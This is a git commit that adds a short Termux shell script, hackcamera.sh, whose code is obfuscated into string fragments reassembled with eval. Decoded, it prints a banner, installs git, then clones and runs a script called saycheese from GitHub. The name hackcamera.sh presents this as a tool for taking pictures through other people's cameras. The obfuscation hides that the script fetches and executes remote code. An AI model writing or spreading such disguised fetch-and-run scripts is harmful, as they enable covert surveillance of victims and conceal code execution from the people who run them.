d79136988ba73ce77e5e6a797a34433c172f9f2c
Acep Triana <49948930+aceptriana@users.noreply.github.com>
2019-05-28 06:05:47 +0700

    Add files via upload

---
+++ hackcamera.sh
@@ -0,0 +1,6 @@
+#Acep X-Code
+#ManusiaBiasaTeam
+#IndonesiaCoderOfHummanity
+z="
+";Ez='"Cam';Wz='slee';dz='sdca';qz='.com';Dz='ant ';CBz='ls';Pz='ode"';Mz=' By ';Uz='Team';vz='sayc';Tz='asa ';cz='cd /';ABz='aych';bz='git';Rz='nusi';Vz='" |l';Sz='a Bi';DBz='sh s';mz='e ht';EBz='.sh';Fz='era"';Hz='olca';tz='xcho';Iz='t';oz='//gi';Lz='werd';fz='term';wz='hees';uz='ice/';yz='cd s';rz='/the';pz='thub';ez='rd';Gz=' | l';nz='tps:';Xz='p 4';Kz=' "Po';Qz=' "Ma';gz='ux-s';Yz='pkg ';Az='figl';Bz='et -';Jz='echo';az='all ';kz='git ';Oz=' X-C';iz='-sto';BBz='eese';Zz='inst';jz='rage';hz='etup';sz='linu';Nz='Acep';Cz='f sl';lz='clon';xz='e';
+eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$z$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Gz$Hz$Iz$z$Jz$Qz$Rz$Sz$Tz$Uz$Vz$Hz$Iz$z$Wz$Xz$z$Yz$Zz$az$bz$z$cz$dz$ez$z$fz$gz$hz$iz$jz$z$kz$lz$mz$nz$oz$pz$qz$rz$sz$tz$uz$vz$wz$xz$z$yz$ABz$BBz$z$CBz$z$DBz$ABz$BBz$EBz"
